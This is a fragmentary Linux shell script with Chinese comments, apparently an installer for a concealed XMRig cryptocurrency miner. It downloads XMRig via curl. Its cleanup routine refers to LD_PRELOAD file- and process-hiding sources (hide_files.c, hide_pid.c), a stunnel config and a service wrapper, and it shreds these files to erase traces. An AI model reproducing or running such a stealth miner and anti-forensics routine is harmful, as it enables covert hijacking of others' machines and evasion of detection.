...
cleanup() {
    ...
    # 删除临时文件
    for file in "$tmp_tar" "$tmp_pid" "/opt/httpd-bin/svc-wrapper.c" "/opt/svc-bin/hide_files.c" "/opt/svc-bin/hide_pid.c" "/opt/svc-bin/Makefile"; do
        if [ -f "$file" ]; then
    ...
    # 删除创建的文件
    for file in "$svc_conf" "$stunnel_conf" "$ld_preload" "$svc_service"; do
        if [ -f "$file" ]; then
            shred -u "$file" 2>/dev/null || rm -f "$file" 2>/dev/null
        fi
    done
...
# 下载并安装
curl -L --retry 3 https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz -o "$tmp_tar" || { echo "下载失败" 1>&2; exit 1; }
